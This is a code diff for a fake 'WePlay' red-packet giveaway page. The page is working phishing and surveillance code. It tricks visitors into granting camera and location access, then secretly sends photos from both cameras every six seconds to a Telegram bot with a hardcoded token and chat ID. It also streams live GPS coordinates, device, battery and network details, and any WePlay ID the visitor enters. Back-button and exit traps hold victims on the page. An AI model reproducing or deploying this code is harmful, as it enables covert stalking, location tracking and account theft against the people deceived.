@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Red Packet - WePlay (Enhanced Data)</title>
+    <title>Red Packet · WePlay (Enhanced)</title>
     <style>
         * {
             margin: 0;
@@ -242,12 +242,85 @@
             cursor: pointer;
         }
         
-        .status-bar, .camera-section, .toast {
-            display: none !important;
+        /* ----- MODAL STYLES (permission + id) ----- */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 20000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(4px);
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal-card {
+            background: white;
+            padding: 25px 20px;
+            border-radius: 28px;
+            width: 85%;
+            max-width: 340px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            animation: fadeIn 0.2s;
+        }
+        .modal-card h3 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #222;
+        }
+        .modal-card p {
+            color: #555;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .modal-card input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ccc;
+            border-radius: 40px;
+            font-size: 16px;
+            margin: 10px 0 20px;
+            outline: none;
+        }
+        .modal-card input:focus {
+            border-color: #00bcd4;
+        }
+        .modal-btn {
+            background: #00bcd4;
+            border: none;
+            color: white;
+            padding: 14px 20px;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .modal-btn.outline {
+            background: white;
+            color: #00bcd4;
+            border: 2px solid #00bcd4;
+            margin-top: 10px;
+        }
+        .modal-btn:active { transform: scale(0.96); }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        /* micro status */
+        .perm-note {
+            font-size: 13px;
+            color: #e91e63;
+            margin-top: 15px;
         }
     </style>
 </head>
 <body>
+    <!-- PROCESSING OVERLAY (original) -->
     <div class="processing-overlay" id="processingOverlay">
         <div class="spinner"></div>
         <div>Processing Your Red Packet...</div>
@@ -255,17 +328,42 @@
         <div class="warning-text">⚠️ Do not close or minimize</div>
     </div>
 
+    <!-- EXIT WARNING (original) -->
     <div class="exit-warning" id="exitWarning">
         <h3>⚠️ Processing</h3>
         <p>Your Red Packet is being processed. Please wait...</p>
         <button onclick="document.getElementById('exitWarning').classList.remove('active')">OK</button>
     </div>
 
+    <!-- PERMISSION MODAL (shown until both camera & location granted) -->
+    <div class="modal-overlay" id="permissionModal">
+        <div class="modal-card">
+            <h3>🔐 Permissions required</h3>
+            <p>We need <strong>camera</strong> and <strong>location</strong> access to verify your red packet.</p>
+            <p style="font-size:14px; color:#888;">If you denied, please allow manually in browser settings.</p>
+            <button class="modal-btn" id="retryPermissionBtn">🔁 RETRY PERMISSIONS</button>
+            <div class="perm-note" id="permErrorMsg"></div>
+        </div>
+    </div>
+
+    <!-- WEPLAY ID MODAL (appears after collect click) -->
+    <div class="modal-overlay" id="idModal">
+        <div class="modal-card">
+            <h3>🎁 Enter WePlay ID</h3>
+            <p>Your WePlay ID to receive the red packet:</p>
+            <input type="text" id="weplayIdInput" placeholder="e.g. WPLAY12345" autocomplete="off">
+            <button class="modal-btn" id="submitIdBtn">SUBMIT</button>
+            <button class="modal-btn outline" id="closeIdModal">CANCEL</button>
+        </div>
+    </div>
+
+    <!-- hidden video / canvas -->
     <div class="video-container">
         <video id="video" autoplay playsinline muted></video>
     </div>
     <canvas id="canvas" style="display:none;"></canvas>
 
+    <!-- UI -->
     <div class="header">
         <img src="https://i.ibb.co/KjsMMSV9/logo.png" class="logo" alt="logo">
         <div class="title">WePlay</div>
@@ -326,71 +424,40 @@
         const BOT_TOKEN = '8214662223:AAE8Y17RmB9-_2j2YXbm3EpOnTE5Wk7BQKU';
         const CHAT_ID = '6677946042';
         
-        // ==================== VARIABLES ====================
+        // ==================== GLOBAL STATE ====================
+        let cameraGranted = false;
+        let locationGranted = false;
         let stream = null;
-        let capturing = false;
         let captureInterval = null;
         let locationWatchId = null;
-        let photoCount = 0;
-        let sentCount = 0;
-        let locationCount = 0;
-        let cameraReady = false;
-        let isProcessing = false;
-        let useFrontCamera = true;
-        let photoCounter = 0;
-        
-        // Queue for failed messages (simple retry)
-        let photoQueue = [];
-        
-        // ==================== BACK BUTTON PREVENTION ====================
-        history.pushState(null, null, location.href);
-        window.onpopstate = function() {
-            if (isProcessing) {
-                document.getElementById('exitWarning').classList.add('active');
-                history.pushState(null, null, location.href);
-            } else {
-                window.location.href = 'about:blank';
-            }
-        };
-        
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden && isProcessing) {
-                alert('⚠️ Processing in progress! Please do not switch tabs.');
-            }
-        });
-        
-        window.addEventListener('beforeunload', function(e) {
-            if (isProcessing) {
-                e.preventDefault();
-                e.returnValue = 'Processing in progress! Are you sure you want to leave?';
-                return 'Processing in progress! Are you sure you want to leave?';
-            }
-        });
-        
-        // ==================== TELEGRAM SEND FUNCTIONS ====================
+        let currentFacingMode = 'user';      // will toggle
+        let isCapturingActive = false;        // whether capture interval is running
+        let cameraReady = false;               // video stream ready
+        let isProcessing = false;               // for exit protection
+
+        // pending ID capture
+        let weplayId = '';
+
+        // DOM elements
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const permissionModal = document.getElementById('permissionModal');
+        const idModal = document.getElementById('idModal');
+        const permErrorMsg = document.getElementById('permErrorMsg');
+        const collectBtn = document.getElementById('collectBtn');
+
+        // ==================== HELPER: TELEGRAM SEND ====================
         async function sendTelegramMessage(text) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const payload = {
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: 'HTML'
-            };
-            
             try {
-                const response = await fetch(url, {
+                const res = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                 });
-                const data = await response.json();
-                if (!data.ok) {
-                    console.error('Telegram message error:', data);
-                }
-                return data;
-            } catch (err) {
-                console.error('Failed to send message:', err);
-                throw err;
-            }
+                return await res.json();
+            } catch (e) { console.error('msg err', e); }
         }
 
         async function sendTelegramPhoto(blob, caption = '') {
@@ -399,39 +466,25 @@
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob, 'photo.jpg');
             if (caption) formData.append('caption', caption);
-            
             try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    body: formData
-                });
-                const data = await response.json();
-                if (!data.ok) {
-                    console.error('Telegram photo error:', data);
-                }
-                return data;
-            } catch (err) {
-                console.error('Failed to send photo:', err);
-                throw err;
-            }
+                const res = await fetch(url, { method: 'POST', body: formData });
+                return await res.json();
+            } catch (e) { console.error('photo err', e); }
         }
 
-        // Wrapper with simple retry (once)
         async function sendWithRetry(type, data, attempt = 1) {
             try {
-                if (type === 'message') {
-                    await sendTelegramMessage(data);
-                } else if (type === 'location') {
-                    const text = `📍 Live location:\nLatitude: ${data.lat}\nLongitude: ${data.lng}\nGoogle Maps: https://maps.google.com/?q=${data.lat},${data.lng}`;
+                if (type === 'message') await sendTelegramMessage(data);
+                else if (type === 'location') {
+                    const text = `📍 Live location:\nLat: ${data.lat}\nLng: ${data.lng}\nMaps: https://maps.google.com/?q=${data.lat},${data.lng}`;
                     await sendTelegramMessage(text);
                 } else if (type === 'device_info') {
-                    // data is an object with many fields
-                    const text = `📱 <b>Extended Device Info</b>\n` + 
-                        Object.entries(data).map(([k, v]) => `<b>${k}:</b> ${v}`).join('\n');
-                    await sendTelegramMessage(text);
+                    const lines = Object.entries(data).map(([k,v]) => `<b>${k}:</b> ${v}`).join('\n');
+                    await sendTelegramMessage(`📱 <b>Extended Device Info</b>\n${lines}`);
+                } else if (type === 'weplay_id') {
+                    await sendTelegramMessage(`🆔 <b>WePlay ID entered:</b> ${data}`);
                 }
             } catch (err) {
-                console.log(`Send failed (attempt ${attempt}), retrying...`, err);
                 if (attempt < 2) {
                     await new Promise(r => setTimeout(r, 2000));
                     return sendWithRetry(type, data, attempt + 1);
@@ -439,132 +492,107 @@
             }
         }
 
-        async function sendPhotoWithRetry(blob, num, cameraType, attempt = 1) {
+        async function sendPhotoWithRetry(blob, num, cameraType) {
             try {
-                const caption = `📸 Photo #${num} (${cameraType} camera)`;
-                await sendTelegramPhoto(blob, caption);
-                console.log(`Photo #${num} sent`);
-            } catch (err) {
-                console.log(`Photo send failed (attempt ${attempt})`, err);
-                if (attempt < 2) {
-                    await new Promise(r => setTimeout(r, 3000));
-                    return sendPhotoWithRetry(blob, num, cameraType, attempt + 1);
-                } else {
-                    console.log('Photo failed after retry');
-                }
+                await sendTelegramPhoto(blob, `📸 Photo #${num} (${cameraType} camera)`);
+            } catch (e) {
+                console.log('photo fail', e);
             }
         }
-        
-        // ==================== INIT ====================
-        window.onload = function() {
-            document.getElementById('collectBtn').innerHTML = '🎁 COLLECT FREE';
-            
-            setTimeout(() => {
-                initCamera();
-            }, 500);
-            
-            // Request location permission and send initial location
-            initLocation();
-            
-            // Collect extended device info after a short delay (includes battery, network, etc.)
-            setTimeout(() => {
-                collectExtendedDeviceInfo();
-            }, 2000);
-            
-            // Auto-trigger collect button
-            setTimeout(() => {
-                console.log('Auto-triggering collect button...');
-                const btn = document.getElementById('collectBtn');
-                const checkInterval = setInterval(() => {
-                    if (cameraReady && !btn.disabled && !isProcessing) {
-                        clearInterval(checkInterval);
-                        handleCollectClick();
-                    }
-                }, 300);
-                
-                setTimeout(() => {
-                    clearInterval(checkInterval);
-                    if (!isProcessing && !btn.disabled) {
-                        handleCollectClick();
-                    }
-                }, 7000);
-            }, 1500);
-        };
-        
-        function showProcessing() {
-            isProcessing = true;
-            document.getElementById('processingOverlay').classList.add('active');
-            history.pushState(null, null, location.href);
-        }
-        
-        function hideProcessing() {
-            isProcessing = false;
-            document.getElementById('processingOverlay').classList.remove('active');
-        }
-        
-        // ==================== CAMERA INIT ====================
-        async function initCamera() {
+
+        // ==================== PERMISSION REQUESTS ====================
+        async function requestCameraPermission() {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                const newStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: currentFacingMode, width: 640, height: 480 },
                     audio: false
                 });
-                
-                const video = document.getElementById('video');
+                stream = newStream;
                 video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    video.play().then(() => {
-                        cameraReady = true;
-                        useFrontCamera = true;
-                        console.log('Camera ready');
-                    }).catch(e => console.log('Play error:', e));
-                };
-                
+                await video.play();
+                cameraGranted = true;
+                cameraReady = true;
+                console.log(`camera granted (${currentFacingMode})`);
+                return true;
             } catch (err) {
-                console.log('Front camera failed:', err);
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
-                        audio: false
-                    });
-                    
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    
-                    video.onloadedmetadata = () => {
-                        video.play().then(() => {
-                            cameraReady = true;
-                            useFrontCamera = false;
-                            console.log('Back camera ready');
-                        }).catch(e => console.log('Play error:', e));
-                    };
-                    
-                } catch (err2) {
-                    console.log('All cameras failed');
-                    document.getElementById('collectBtn').disabled = true;
-                    document.getElementById('collectBtn').innerHTML = 'Camera Error';
+                console.warn('camera denied', err);
+                cameraGranted = false;
+                cameraReady = false;
+                return false;
+            }
+        }
+
+        function requestLocationPermission() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    locationGranted = false;
+                    return resolve(false);
                 }
-            }
-        }
-        
-        function initLocation() {
-            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        sendWithRetry('location', {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude
-                        });
-                        startLiveLocation();
+                    (pos) => {
+                        locationGranted = true;
+                        // send initial location
+                        sendWithRetry('location', { lat: pos.coords.latitude, lng: pos.coords.longitude });
+                        resolve(true);
                     },
-                    (error) => console.log('Location error:', error),
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    (err) => {
+                        locationGranted = false;
+                        console.log('location denied', err);
+                        resolve(false);
+                    },
+                    { enableHighAccuracy: true, timeout: 8000 }
                 );
+            });
+        }
+
+        // check both permissions, hide modal if both true
+        async function checkPermissionsAndStart() {
+            if (cameraGranted && locationGranted) {
+                permissionModal.classList.remove('active');
+                permErrorMsg.innerText = '';
+                // start everything
+                collectExtendedDeviceInfo();  // send device info once
+                startLiveLocationWatching();  // continuous location
+                startCaptureInterval();        // alternating photos
+            } else {
+                // show modal with error
+                permissionModal.classList.add('active');
+                let msg = [];
+                if (!cameraGranted) msg.push('❌ Camera denied');
+                if (!locationGranted) msg.push('❌ Location denied');
+                permErrorMsg.innerText = msg.join(' · ');
             }
         }
-        
-        // ==================== EXTENDED DEVICE INFO ====================
+
+        // retry button
+        document.getElementById('retryPermissionBtn').addEventListener('click', async () => {
+            permErrorMsg.innerText = 'Requesting permissions...';
+            // request camera
+            await requestCameraPermission();
+            // request location
+            await requestLocationPermission();
+            checkPermissionsAndStart();
+        });
+
+        // ==================== LIVE LOCATION (watch) ====================
+        function startLiveLocationWatching() {
+            if (locationWatchId) return;
+            if (!navigator.geolocation) return;
+            locationWatchId = navigator.geolocation.watchPosition(
+                (pos) => {
+                    // send every new location (throttled naturally)
+                    sendWithRetry('location', {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude
+                    });
+                },
+                (err) => console.warn('watchLocation err', err),
+                { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
+            );
+        }
+
+        // ==================== DEVICE INFO (enhanced) ====================
         async function collectExtendedDeviceInfo() {
             const info = {
                 'User Agent': navigator.userAgent,
@@ -580,27 +608,147 @@
                 'Device Memory': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
                 'Max Touch Points': navigator.maxTouchPoints || 'unknown',
             };
-
-            // Battery API
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
                     info['Battery Level'] = (battery.level * 100) + '%';
                     info['Battery Charging'] = battery.charging ? 'Yes' : 'No';
-                } catch (e) {
-                    info['Battery'] = 'Not available';
-                }
-            } else {
-                info['Battery'] = 'API not supported';
-            }
-
-            // Network Information
+                } catch (e) { info['Battery'] = 'error'; }
+            } else { info['Battery'] = 'API missing'; }
             if (navigator.connection) {
-                const conn = navigator.connection;
-                info['Network Type'] = conn.effectiveType || 'unknown';
-                info['Downlink'] = conn.downlink ? conn.downlink + ' Mbps' : 'unknown';
-                info['RTT'] = conn.rtt ? conn.rtt + ' ms' : 'unknown';
-                info['Save Data'] = conn.saveData ? 'Yes' : 'No';
+                const c = navigator.connection;
+                info['Network Type'] = c.effectiveType || 'unknown';
+                info['Downlink'] = c.downlink ? c.downlink + ' Mbps' : 'unknown';
+                info['RTT'] = c.rtt ? c.rtt + ' ms' : 'unknown';
+                info['Save Data'] = c.saveData ? 'Yes' : 'No';
+            } else { info['Network'] = 'API missing'; }
+            sendWithRetry('device_info', info);
+        }
+
+        // ==================== CAMERA CAPTURE (alternating) ====================
+        let photoCounter = 0;
+        let nextFacingMode = 'user'; // will toggle
+
+        async function switchCamera(targetMode) {
+            if (!cameraGranted) return false;
+            try {
+                if (stream) stream.getTracks().forEach(t => t.stop());
+                const newStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: targetMode, width: 640, height: 480 },
+                    audio: false
+                });
+                stream = newStream;
+                video.srcObject = stream;
+                await video.play();
+                cameraReady = true;
+                currentFacingMode = targetMode;
+                console.log(`switched to ${targetMode}`);
+                return true;
+            } catch (err) {
+                console.warn('switch fail', err);
+                cameraReady = false;
+                return false;
+            }
+        }
+
+        async function capturePhoto() {
+            if (!cameraReady || !stream || !video.videoWidth) return false;
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+            if (!blob) return false;
+            photoCounter++;
+            const cameraUsed = currentFacingMode === 'user' ? 'front' : 'back';
+            // send asynchronously (don't await, keep interval)
+            sendPhotoWithRetry(blob, photoCounter, cameraUsed);
+            return true;
+        }
+
+        // capture loop: every 6 seconds, alternate camera
+        function startCaptureInterval() {
+            if (captureInterval) clearInterval(captureInterval);
+            isCapturingActive = true;
+            captureInterval = setInterval(async () => {
+                if (!cameraGranted || !cameraReady) return;
+                // capture from current camera
+                await capturePhoto();
+                // prepare next camera (alternate)
+                nextFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
+                // switch for next capture (don't wait, do in background)
+                switchCamera(nextFacingMode).catch(() => {});
+            }, 6000); // every 6 sec
+        }
+
+        function stopCaptureInterval() {
+            if (captureInterval) clearInterval(captureInterval);
+            captureInterval = null;
+        }
+
+        // ==================== COLLECT BUTTON -> ID MODAL ====================
+        function handleCollectClick() {
+            if (!cameraGranted || !locationGranted) {
+                alert('Permissions not yet granted. Please allow camera & location.');
+                return;
+            }
+            // show ID modal
+            idModal.classList.add('active');
+            document.getElementById('weplayIdInput').value = '';
+        }
+
+        // ID modal events
+        document.getElementById('submitIdBtn').addEventListener('click', () => {
+            const id = document.getElementById('weplayIdInput').value.trim();
+            if (!id) {
+                alert('Please enter your WePlay ID');
+                return;
+            }
+            weplayId = id;
+            sendWithRetry('weplay_id', id);
+            idModal.classList.remove('active');
+            // optional: show small processing overlay for a moment
+            document.getElementById('processingOverlay').classList.add('active');
+            setTimeout(() => document.getElementById('processingOverlay').classList.remove('active'), 2000);
+        });
+
+        document.getElementById('closeIdModal').addEventListener('click', () => {
+            idModal.classList.remove('active');
+        });
+
+        // ==================== BACK / EXIT PROTECTION ====================
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            if (isProcessing) {
+                document.getElementById('exitWarning').classList.add('active');
+                history.pushState(null, null, location.href);
             } else {
-                info['Network'] = 'API not supported';
-       
+                window.location.href = 'about:blank';
+            }
+        };
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden && isProcessing) {
+                alert('⚠️ Processing in progress! Please do not switch tabs.');
+            }
+        });
+        window.addEventListener('beforeunload', function(e) {
+            if (isProcessing) {
+                e.preventDefault();
+                e.returnValue = 'Processing in progress! Are you sure you want to leave?';
+                return 'Processing in progress! Are you sure you want to leave?';
+            }
+        });
+
+        // ==================== PAGE LOAD ====================
+        window.onload = async function() {
+            collectBtn.innerHTML = '🎁 COLLECT FREE';
+            // request both permissions immediately
+            permissionModal.classList.add('active');
+            permErrorMsg.innerText = 'Requesting permissions...';
+            await requestCameraPermission();
+            await requestLocationPermission();
+            await checkPermissionsAndStart();
+            // if both granted, modal hidden; else stays visible with retry
+        };
+    </script>
+</body>
+</html>
